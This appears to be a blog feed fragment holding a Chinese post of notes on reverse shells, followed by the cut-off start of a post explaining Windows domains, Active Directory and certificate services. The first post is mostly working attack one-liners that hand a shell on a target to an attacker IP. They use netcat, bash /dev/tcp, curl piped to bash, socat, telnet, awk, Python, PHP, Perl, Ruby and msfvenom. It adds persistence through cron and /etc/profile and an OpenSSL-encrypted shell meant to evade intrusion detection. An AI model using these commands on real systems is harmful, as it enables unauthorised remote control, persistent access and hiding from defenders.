    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以前学过的内容，记录一遍。</p><span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>反弹shell，就是攻击机监听在某个TCP&#x2F;UDP端口为服务器，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机。</p><h1 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h1><p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。</p><h1 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h1><p>反弹shell通常适用于如下几种情况：<br>目标机因防火墙受限，目标机器只能发送请求，不能接收请求。<br>目标机端口被占用。<br>目标机位于互联网，或IP会动态变化，攻击机无法连接。<br>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知。</p><p>对于以上几种情况，我们是无法利用正向连接的，要用反向连接。</p><p>反向连接就是，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序。</p><p>反弹shell的方式有很多，那具体要用哪种方式还需要根据目标主机的环境来确定，比如目标主机上如果安装有netcat，那我们就可以利用netcat反弹shell，如果具有python环境，那我们可以利用python反弹shell。如果具有php环境，那我们可以利用php反弹shell。</p><h1 id="利用netcat反弹shell"><a href="#利用netcat反弹shell" class="headerlink" title="利用netcat反弹shell"></a>利用netcat反弹shell</h1><p>Netcat 是一款简单的Unix工具，使用UDP和TCP协议。 它是一个可靠的容易被其他程序所启用的后台操作工具，同时它也被用作网络的测试工具或黑客工具。 使用它你可以轻易的建立任何连接。</p><p>目前，默认的各个linux发行版本已经自带了netcat工具包，但是可能由于处于安全考虑原生版本的netcat带有可以直接发布与反弹本地shell的功能参数 -e 都被阉割了，所以我们需要自己手动下载二进制安装包，安装的如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz</span><br><span class="line">tar -xvzf netcat-0.7.1.tar.gz</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">make clean</span><br></pre></td></tr></table></figure><p>安装完原生版本的 netcat 工具后，便有了netcat -e参数，我们就可以将本地bash反弹到攻击机上了。</p><p>攻击机开启本地监听：<br><code>netcat -lvvp 2333</code></p><p>目标机主动连接攻击机：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netcat 47.xxx.xxx.72 2333 -e /bin/bash</span><br><span class="line"><span class="comment"># nc &lt;攻击机IP&gt; &lt;攻击机端口&gt; -e /bin/bash</span></span><br></pre></td></tr></table></figure><h1 id="利用bash反弹shell"><a href="#利用bash反弹shell" class="headerlink" title="利用bash反弹shell"></a>利用bash反弹shell</h1><p>使用bash结合重定向方法的一句话反弹shell命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</span><br><span class="line">或</span><br><span class="line">bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1&quot;</span></span><br><span class="line"><span class="comment"># bash -i &gt;&amp; /dev/tcp/攻击机IP/攻击机端口 0&gt;&amp;1</span></span><br></pre></td></tr></table></figure><p>命令详解：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bash -i  <span class="comment"># 产生一个bash交互环境</span></span><br><span class="line">&gt;&amp;       <span class="comment"># 将联合符号前面的内容与后面的内容相结合，然后一起重定向给后者</span></span><br><span class="line">/dev/tcp/47.xxx.xxx.72/2333  </span><br><span class="line"><span class="comment"># Linux环境中所有内容都是以文件的形式存在的，</span></span><br><span class="line"><span class="comment"># 该命令是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。</span></span><br><span class="line">0&gt;&amp;1     <span class="comment"># 将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容</span></span><br></pre></td></tr></table></figure><p>完整解读：<br>bash产生了一个交互环境和本地主机主动发起与攻击机2333端口建立的连接（即TCP 2333会话连接）相结合，然后在重定向个TCP 2333会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash反弹环境。</p><p>攻击机开启监听：<br><code>nc -lvvp 2333</code></p><p>目标机主动连接攻击机<br><code>bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</code></p><h1 id="Curl配合bash反弹shell"><a href="#Curl配合bash反弹shell" class="headerlink" title="Curl配合bash反弹shell"></a>Curl配合bash反弹shell</h1><p>这里的操作借助了Linux中的管道。</p><p>首先，在攻击者vps的web目录里面创建一个index文件（index.php或index.html），内容如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>并开启2333端口监听<br>然后在目标机上执行如下，即可反弹shell：<br><code>curl 47.xxx.xxx.72|bash</code></p><p><code>curl IP|bash</code> 中的IP可以是任意格式的，十进制，十六进制，二进制等。</p><h1 id="将反弹shell命令写入定时任务"><a href="#将反弹shell命令写入定时任务" class="headerlink" title="将反弹shell命令写入定时任务"></a>将反弹shell命令写入定时任务</h1><p>我们可以在目标主机的定时任务文件中写入一个反弹shell的脚本，但是前提是我们必须要知道目标主机当前的用户名是哪个。因为我们的反弹shell命令是要写在 <code>/var/spool/cron/[crontabs]/&lt;username&gt;</code> 内的，所以必须要知道远程主机当前的用户名。否则就不能生效。<br>比如，当前用户名为root，我们就要将下面内容写入到 <code>/var/spool/cron/root</code> 中。(centos系列主机)<br>比如，当前用户名为root，我们就要将下面内容写入到 <code>/var/spool/cron/crontabs/root</code> 中。(Debian&#x2F;Ubuntu系列主机)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每隔一分钟，向47.xxx.xxx.72的2333号端口发送shell</span></span><br></pre></td></tr></table></figure><h1 id="将反弹shell的命令写入-x2F-etc-x2F-profile文件"><a href="#将反弹shell的命令写入-x2F-etc-x2F-profile文件" class="headerlink" title="将反弹shell的命令写入&#x2F;etc&#x2F;profile文件"></a>将反弹shell的命令写入&#x2F;etc&#x2F;profile文件</h1><p>将以下的反弹shell命令写入&#x2F;etc&#x2F;profile文件中，&#x2F;etc&#x2F;profile中的内容会在用户打开bash窗口时执行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1 &amp;</span><br><span class="line"><span class="comment"># 最后面的&amp;为的是防止管理员无法输入命令</span></span><br></pre></td></tr></table></figure><p>当目标主机管理员远程连接该主机时，就会执行该命令，成功获得目标机的shell</p><h1 id="利用Socat反弹shell"><a href="#利用Socat反弹shell" class="headerlink" title="利用Socat反弹shell"></a>利用Socat反弹shell</h1><p>Socat是Linux下一个多功能的网络工具，名字来由是”Socket CAT”，因此可以看出它是基于socket的，其功能与netcat类似，可以看作netcat的加强版。<br><a href="http://brieflyx.me/2015/linux-tools/socat-introduction/">SOCAT 简介</a></p><p>安装socat的方法很简单：<br>Ubuntu等可以直接使用 <code>apt-get install socat</code> 命令进行安装<br>也可在 <a href="http://www.dest-unreach.org/socat/">官网</a> 下源码包</p><p>攻击机开启监听：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-LISTEN:2333 -</span><br><span class="line">或</span><br><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure><p>目标机主动连接攻击机：<br><code>socat tcp-connect:47.xxx.xxx.72:2333 exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane</code></p><h1 id="利用Telnet反弹shell"><a href="#利用Telnet反弹shell" class="headerlink" title="利用Telnet反弹shell"></a>利用Telnet反弹shell</h1><p>当nc和&#x2F;dev&#x2F;tcp不可用，且目标主机和攻击机上支持Telnet服务时，我们可以用Telnet反弹shell</p><p>方法一：<br>攻击机开启本地监听：<br><code>nc -lvvp 2333</code></p><p>目标机主动连接攻击机：<br><code>mknod a p; telnet 47.xxx.xxx.72 2333 0&lt;a | /bin/bash 1&gt;a</code></p><p>方法二：<br>攻击机需要开启两个本地监听：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333</span><br><span class="line">nc -lvvp 4000</span><br></pre></td></tr></table></figure><p>目标机主动连接攻击机：<br><code>telnet 47.101.57.72 2333 | /bin/bash | telnet 47.101.57.72 4000</code></p><p>获得shell后，在攻击机2333端口的终端上输入的命令会在目标机上执行，执行的回显将通过4000端口的终端显示出来。</p><h1 id="利用awk反弹shell"><a href="#利用awk反弹shell" class="headerlink" title="利用awk反弹shell"></a>利用awk反弹shell</h1><p>AWK 是一种处理文本文件的语言，是一个强大的文本分析工具。在众多的Linux发行版本中，都会预装这个应用程序。<br>攻击机开启本地监听：<br><code>nc -lvvp 2333</code></p><p>目标机主动连接攻击机：<br><code>awk &#39;BEGIN&#123;s=&quot;/inet/tcp/0/47.xxx.xxx.72/2333&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#39;</code></p><h1 id="各种脚本反弹shell"><a href="#各种脚本反弹shell" class="headerlink" title="各种脚本反弹shell"></a>各种脚本反弹shell</h1><h2 id="python脚本反弹shell"><a href="#python脚本反弹shell" class="headerlink" title="python脚本反弹shell"></a>python脚本反弹shell</h2><p>当目标主机上有python环境时，我们可以用Python来反弹shell。Python在现在一般发行版Linux系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。</p><p>攻击机开启本地监听：<br><code>nc -lvvp 2333</code></p><p>目标主机主动连接攻击机：<br><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;47.xxx.xxx.72&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></p><h2 id="PHP脚本反弹shell"><a href="#PHP脚本反弹shell" class="headerlink" title="PHP脚本反弹shell"></a>PHP脚本反弹shell</h2><p>当目标主机上有phph环境时，我们可以用php来反弹shell。</p><p>攻击机开启本地监听：<br><code>nc -lvvp 2333</code></p><p>目标机主动连接攻击机：<br><code>php -r &#39;$sock=fsockopen(&quot;47.xxx.xxx.72&quot;,2333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p><h2 id="Perl脚本反弹shell"><a href="#Perl脚本反弹shell" class="headerlink" title="Perl脚本反弹shell"></a>Perl脚本反弹shell</h2><p>当目标主机上有perl环境时，我们可以用perl来反弹shell。</p><p>攻击机开启本地监听：<br><code>nc -lvvp 2333</code></p><p>目标机主动连接攻击机：<br><code>perl -e &#39;use Socket;$i=&quot;47.101.57.72&quot;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;</code></p><h2 id="Ruby脚本反弹shell"><a href="#Ruby脚本反弹shell" class="headerlink" title="Ruby脚本反弹shell"></a>Ruby脚本反弹shell</h2><p>当目标主机上有ruby环境时，我们可以用ruby来反弹shell。</p><p>攻击机开启本地监听：<br><code>nc -lvvp 2333</code></p><p>目标机主动连接攻击机：<br><code>ruby -rsocket -e &#39;c=TCPSocket.new(&quot;47.xxx.xxx.72&quot;,&quot;2333&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39; 或 ruby -rsocket -e &#39;exit if fork;c=TCPSocket.new(&quot;47.xxx.xxx.72&quot;,&quot;2333&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39;</code></p><h1 id="使用Metasploit生成反弹shell用的一句话"><a href="#使用Metasploit生成反弹shell用的一句话" class="headerlink" title="使用Metasploit生成反弹shell用的一句话"></a>使用Metasploit生成反弹shell用的一句话</h1><p>强大的Metasploit框架也为我们提供了生成一句话反弹shell的工具，即msfvenom，绝对的实用。当我们不记得前面说的所有反弹shell的反弹语句时，只要我们有Metasploit，那么我们随时都可以使用 <code>msfvenom -l</code> 来查询生成我们所需要的各类命令行一句话，具体使用方法如下。</p><p>我们可以直接使用 <code>msfvenom -l</code> 结合关键字过滤（如cmd&#x2F;unix&#x2F;reverse），列出我们需要生成的各类反弹shell一句话的payload：<br><code>msfvenom -l payloads | grep &#39;cmd/unix/reverse&#39;</code></p><p>metasploit支持生成反弹shell一句话的类型非常丰富，可以依据渗透测试对象自行选择使用。比如，我们获取一个python反弹shell的一句话：<br><code>msfvenom -p cmd/unix/reverse_python LHOST=47.xxx.xxx.72 LPORT=2333 -f raw</code></p><p>将生成的python反弹shell的一句话在目标主机上执行即可</p><h1 id="反弹shell后获取模拟终端"><a href="#反弹shell后获取模拟终端" class="headerlink" title="反弹shell后获取模拟终端"></a>反弹shell后获取模拟终端</h1><p>其实，上面所讲的各种方法获取的shell都不是一个标准的虚拟终端环境，它仅仅是一个标准输入。你会发现存在一个问题，就是即使我们获取了目标虚拟终端控制权限，但是往往会发现其交互性非常的差，回显信息与可交互性非常的差和不稳定，具体见情况有以下几个种。</p><ul><li>获取的虚拟终端没有交互性，我们想给添加的账号设置密码或执行sudo等命令，无法完成。</li><li>标准的错误输出无法显示，无法正常使用vim等文本编辑器等。</li><li>获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接。</li></ul><p>这往往都是因为我们获取的shell并不是标准的虚拟终端，为了能够完成输入密码等操作，我们必须模拟一个真正的终端设备。</p><p>我们其实可以借助于python默认包含的一个pty标准库来获取一个标准的虚拟终端环境。</p><p>只需在获取的shell里面输入如下命令，即可模拟一个终端设备：<br><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p><p><img src="/simg/shell-1.png" alt="模拟终端设备"></p><p>如上图所示，成功模拟在shell中出了一个终端设备，并成功执行了sudo等命令。</p><h1 id="使用OpenSSL反弹加密shell"><a href="#使用OpenSSL反弹加密shell" class="headerlink" title="使用OpenSSL反弹加密shell"></a>使用OpenSSL反弹加密shell</h1><p>在上文中，我们总结了很多反弹shell得方法，但是我发现这种反弹 shell 方式都有一个缺点，那就是所有的流量都是明文传输的。这些通过shell通过传输的流量都可以被管理员直接抓取并理解，当目标主机网络环境存在网络防御检测系统时（IDS、IPS等），网络防御检测系统会获取到我们的通信内容并进行告警和阻止。因此，我们需要对通信的内容进行混淆或加密，这时可以选择使用 OpenSSL 反弹一个加密的 shell。</p><h2 id="OpenSSL简介"><a href="#OpenSSL简介" class="headerlink" title="OpenSSL简介"></a>OpenSSL简介</h2><p>在计算机网络上，OpenSSL 是一个开放源代码的软件库包，应用程序可以使用这个包来进行安全通信，避免窃听，同时确认另一端连接者的身份。</p><p>SSL协议要求建立在可靠的传输层协议(TCP)之上。SSL协议的优势在于它是与应用层协议独立无关的，高层的应用层协议(例如：HTTP，FTP，TELNET等)能透明地建立于SSL协议之上。SSL协议在应用层协议通信之前就已经完成加密算法、通信密钥的协商及服务器认证工作。在此之后应用层协议所传送的数据都会被加密，从而保证通信的私密性。</p><p>在利用 OpenSSL 反弹 shell 之前需要先生成自签名证书：<br><code>openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes</code></p><p>生成自签名证书时会提示输入证书信息，如果懒得填写可以一路回车即可</p><h2 id="使用OpenSSL反弹加密shell-1"><a href="#使用OpenSSL反弹加密shell-1" class="headerlink" title="使用OpenSSL反弹加密shell"></a>使用OpenSSL反弹加密shell</h2><p>实验环境：Linux</p><p>目标机：<br>系统：Linux<br>IP：192.168.1.8</p><p>攻击机：<br>系统：Linux<br>IP：47.xxx.xxx.72</p><p>假设我们从目标机反弹 shell 到攻击机 。首先需要利用上一步生成的自签名证书，在攻击机上使用 OpenSSL 监听一个端口，在这里使用 2333 端口：<br><code>openssl s_server -quiet -key key.pem -cert cert.pem -port 2333</code></p><p>此时 OpenSSL 便在攻击机的 2333 端口上启动了一个 SSL&#x2F;TLS server。</p><p>这时在目标机进行反弹 shell 操作，命令为：<br><code>mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quite -connect 47.xxx.xxx.72:2333 &gt; /tmp/s; rm /tmp/s</code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;以前学过的内容，记录一遍。&lt;/p&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="反弹shell" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%8F%8D%E5%BC%B9shell/"/>
    
    
    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Windows内网渗透之域渗透</title>
    <link href="http://example.com/2023/08/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    <id>http://example.com/2023/08/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%9F%9F%E6%B8%97%E9%80%8F/</id>
    <published>2023-08-24T16:00:00.000Z</published>
    <updated>2023-08-25T07:50:01.451Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>域(Domain)是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系(即Trust Relation)。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。</p><span id="more"></span><h1 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h1><h2 id="用户组与工作组"><a href="#用户组与工作组" class="headerlink" title="用户组与工作组"></a>用户组与工作组</h2><h3 id="用户-1"><a href="#用户-1" class="headerlink" title="用户"></a>用户</h3><p>Windows系统存在一些为了特定用途而设置的用户，分别是：SYSTEM(系统)、Trustedinstaller(信任程序模块)、Everyone(所有人)、Creator Owner(创建者)等，这些特殊用户不属于任何用户组，是完全独立的账户。其中SYSTEM拥有整台计算机管理权限的账户，一般操作无法获取与它等价的权限。</p><h3 id="用户组"><a href="#用户组" class="headerlink" title="用户组"></a>用户组</h3><p>Windows系统内置了许多本地用户组，用于管理用户权限。只要用户账户加入到对应的用户组内，则用户账户也将具备对应用户组所拥有的权限。</p><p>默认情况下，系统为用户分了7个组，并给每个组赋予不同的操作权限。这些组为：管理员组(Administrators)、文件复制组(Replicator)、来宾用户组(Guests)、身份验证用户组(Authenticated Users)。</p><h3 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h3><p>工作组(Workgroup)是最常用最简单最普遍的资源管理模式，默认情况下计算机都在名为workgroup的工作组中。工作组模式比较松散，适合网络中计算机数量较少，不需要严格管理的情况。</p><h2 id="域中用户"><a href="#域中用户" class="headerlink" title="域中用户"></a>域中用户</h2><h3 id="域用户"><a href="#域用户" class="headerlink" title="域用户"></a>域用户</h3><p>域环境中的用户和本地用户的账户不同，域用户账户保存在活动目录中。在域环境里，一个域用户可以在域中的任何一台计算机上登录。在域中用户可以使用SID(Security Identifier)来表明身份，用NTLM哈希或者Kerberos来验证身份。</p><h3 id="机器用户"><a href="#机器用户" class="headerlink" title="机器用户"></a>机器用户</h3><p>机器用户也被称作机器账号或计算机账号，所有加入域的主机都会有一个机器用户，机器用户的用户名以 <code>$</code> 结尾。</p><h3 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h3><p>组策略(Group Policy)用于控制用户账户和计算机账户的工作环境。组策略提供了操作系统、应用程序和活动目录中用户设置的集中化管理和配置。其中本地的组策略(LGPO或LocalGPO)，可以在独立且非域的计算机上管理组策略对象。在域环境中的组策略通常被称作GPO(Group Policy Object)。</p><h1 id="内网常用协议"><a href="#内网常用协议" class="headerlink" title="内网常用协议"></a>内网常用协议</h1><p>Windows查询名称解析的顺序为DNS、mDNS、LLMNR、NBNS。</p><h2 id="NetBIOS"><a href="#NetBIOS" class="headerlink" title="NetBIOS"></a>NetBIOS</h2><p>NetBIOS(Network Basic Input&#x2F;Output System)是基于网络的交互协议，通常使用UDP 137、UDP 138、TCP 139等端口。Windows在安装TCP&#x2F;IP协议时会默认启用该协议，可能导致未设置权限校验的网络资源被访问。</p><p>基于NetBIOS有NBNS(NetBIOS Name Service)服务，通常监听在UDP 137端口，该服务提供三种功能：将NetBIOS名称解析到IP、查询某一个NetBIOS节点的状态，注册&#x2F;释放一个NetBIOS名。</p><p>可以使用 <code>nbtstat</code> 工具利用NetBIOS协议管理网络。</p><h2 id="LLMNR"><a href="#LLMNR" class="headerlink" title="LLMNR"></a>LLMNR</h2><p>链路本地多播名称解析(Link-Local Multicast Name Resolution,LLMNR)是一个基于DNS数据包格式的协议，IPv4和IPv6的主机可以通过此协议对同一本地链路上的主机执行名称解析。该协议在Windows Vista后被引入。</p><h2 id="mDNS"><a href="#mDNS" class="headerlink" title="mDNS"></a>mDNS</h2><p>mDNS(multicast DNS)在Windows10中被引入，监听UDP 5353端口，对应的多播地址为224.0.0.251(FF02::FB)。mDNS主要实现了在没有传统DNS服务器的情况下使局域网内的主机实现相互发现和通信。</p><h2 id="WPAD"><a href="#WPAD" class="headerlink" title="WPAD"></a>WPAD</h2><p>网络代理自动发现协议(Web Proxy Auto-Discovery,WPAD)是一种客户端使用DHCP和&#x2F;或DNS发现方法来定位一个配置文件URL的方法。在检测和下载配置文件后，它可以执行配置文件以测定特定URL应使用的代理。</p><h1 id="域"><a href="#域" class="headerlink" title="域"></a>域</h1><p>域指将网络中堕胎计算机逻辑上组织到一起，进行集中管理的逻辑环境。域是组织与存储资源的核心管理单员，在域中，至少有一台域空直接，域控制器中保存着整个域的用户账号和安全数据库。</p><h2 id="域结构"><a href="#域结构" class="headerlink" title="域结构"></a>域结构</h2><h3 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h3><p>域树(Trees)由多个域组成，这些域共享同一表结构和配置，形成一个连续的命名空间(namespace)。</p><h3 id="林"><a href="#林" class="headerlink" title="林"></a>林</h3><p>林(Forests)是一个复杂的AD实例，由一个或数个域组成，每个域树都有自己唯一的名称空间。</p><h2 id="域控制器"><a href="#域控制器" class="headerlink" title="域控制器"></a>域控制器</h2><p>ADDS的目录存储在域控制器(Domain Controller)内，一个域内可以有多台域控制器，每一个域控制器的地位几乎是平等的，有几乎相同地数据库。</p><p>在一台域控制器添加一个用户账户后，这个账户会被自动复制到其他域控制器的数据库中。</p><p>AD数据库有多主机复制模式(Multi-master Replication Model)和单主机复制模式(Sing-master Replication Model)。</p><p>多主机模式可以直接更新任何一台域控制器内的AD对象，并将更新之后的对象复制到其他域控制器，大部分数据都是用多主机模式进行复制。</p><p>单主机复制模式是指由一台被称作操作主机(Operations Master)的域控制器负责接收更改数据的请求，并将数据复制到其他的域控制器。</p><h2 id="信任"><a href="#信任" class="headerlink" title="信任"></a>信任</h2><p>两个域之间需要创建信任关系，才可以访问对应域内的资源。</p><h3 id="域信任类型"><a href="#域信任类型" class="headerlink" title="域信任类型"></a>域信任类型</h3><p>Active Directory的信任方式可以分为以下几种：</p><ul><li>Tree-Root Trust<br>双向具有转移性</li><li>Parent-Child Trust<br>具有转移性，双向行人</li><li>Forest Trust<br>如果两个林创建了信任关系，则林中所有的域都相互信任<br>两个林之间的信任关系无法自动扩展到其他林上</li><li>Realm Trust<br>ADDS域可以和非Windows系统的Kerberos域之间创建信任</li><li>External Trust<br>位于两个林内的域之间可以通过外部信任来创建信任关系</li><li>Shortcut Trust<br>可以缩短验证用户身份的时间</li></ul><h3 id="OU"><a href="#OU" class="headerlink" title="OU"></a>OU</h3><p>组织单位(Organization Unit,OU)是一个容器对象，将域中的对象组织成逻辑组，帮助管理员管理。OU包含用户、计算机、工作组、打印机、安全策略以及其他组织单位等。</p><h1 id="Active-Dirctory"><a href="#Active-Dirctory" class="headerlink" title="Active Dirctory"></a>Active Dirctory</h1><p>活动目录(Active Direcory,AD)是面向Windows Server的目录服务。Active Directory存储了有关网络对象的信息，并且让管理员和用户能够查找和使用这些信息。</p><h2 id="ADDS"><a href="#ADDS" class="headerlink" title="ADDS"></a>ADDS</h2><p>Active Directory提供目录服务的组件被称作Active Directory域服务 (Active Directory Domain Services, ADDS) ，负责目录数据库的存储、增删改查等工作，可以用在多种局域网、广域网的场景中。</p><p>从逻辑上看，ADDS的组件可以分为Partition、Schema、Domain、Domain tree、Forest、OU、Container。</p><p>Partition也被称为naming context，是AD DS数据库的一部分。Schema是存储在 ADDS 中数据的定义。Container是为ADDS提供组织框架的对象。</p><p>从实现上区分，ADDS可以分为Domain controller、Data store、Global catalog server、RODC (Read-only domain controller) 、Site、Subnet。</p><p>每个域控制器都有完整的ADDS数据，每个域控都可以处理数据的修改并同步至其他的域控。</p><p>域控会有一份数据拷贝 (Data store) ，默认存储在 <code>C:\Windows\NTDS</code> 目录下。</p><p>Global catalog server是存储全局catalog的域控，catlog以只读的方式存储了一个multiple-domain forest的所有对象，用于加速搜索。</p><h2 id="名称空间"><a href="#名称空间" class="headerlink" title="名称空间"></a>名称空间</h2><p>名称空间(namespace)是一块界定好的区域，在区域内可以用名称找到与之相关的信息。</p><h2 id="对象与属性"><a href="#对象与属性" class="headerlink" title="对象与属性"></a>对象与属性</h2><p>ADDS内的资源都是以对象(Object)的形式存在的，对象通过属性(Attrbute)来描述其特征。</p><h1 id="ADCS"><a href="#ADCS" class="headerlink" title="ADCS"></a>ADCS</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Active Directory证书服务(Active Directory Certificate Services,ADCS)是微软用于实现PKI的服务。</p><h2 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h2><p>ADCS中的证书是X.509格式的数字签名文档，用于加密、签名或身份验证等。</p><p>证书常用的属性由下述字段组成</p><ul><li>Subject:主题</li><li>Public Key:公钥</li><li>Extended Key Usages(EKUs):扩展密钥，描述证书的对象标识符(Object identifier,OID)</li></ul><p>常用的EKU OID包括：</p><ul><li><p>代码签名<br>OID 1.3.6.1.5.5.7.3.3<br>证书用于签署可执行代码</p></li><li><p>加密文件系统<br>OID 1.3.6.1.4.1.311.10.3.4<br>证书用于加密文件系统</p></li><li><p>安全电子邮件<br>OID 1.3.6.1.5.5.7.3.4<br>证书用于加密电子邮件</p></li><li><p>客户端身份验证<br>OID 1.3.6.1.5.5.7.3.2</p></li><li><p>智能卡登录<br>OID 1.3.6.1.4.1.311.20.2.2</p></li><li><p>服务器认证<br>OID 1.3.6.1.5.5.7.3.1<br>证书用于识别服务器 (例如HTTPS 证书)</p></li></ul><h2 id="证书模板"><a href="#证书模板" class="headerlink" title="证书模板"></a>证书模板</h2><p>微软提供了证书模板的功能，方便在域内签发证书。证书模板是注册策略和预定义证书设置的集合，包含证书有效期、用途、申请者等信息。</p><h2 id="证书注册"><a href="#证书注册" class="headerlink" title="证书注册"></a>证书注册</h2><p>证书可以通过以下几种方式注册：</p><p>通过 Windows 客户端证书注册协议 (MS-WCCE)<br>通过 ICertPassage 远程协议 (MS-ICPR)<br>在 ADCS 开启了对应 Web 服务的情况下，使用 Web 服务注册<br>在服务器安装了对应服务时，通过证书注册服务 (CES) 注册<br>在服务器安装了对应服务时，使用网络设备注册服务</p><h1 id="组策略-1"><a href="#组策略-1" class="headerlink" title="组策略"></a>组策略</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>组策略 (Group Policy, GP) 用于管理网络环境中的用户和设备，定义了系统管理员管理工作所要的各种模板组件。</p><p>组策略有以下功能：</p><p>管理注册表<br>设置脚本<br>重定向文件夹<br>管理应用程序<br>指定安全选项</p><h2 id="常用概念"><a href="#常用概念" class="headerlink" 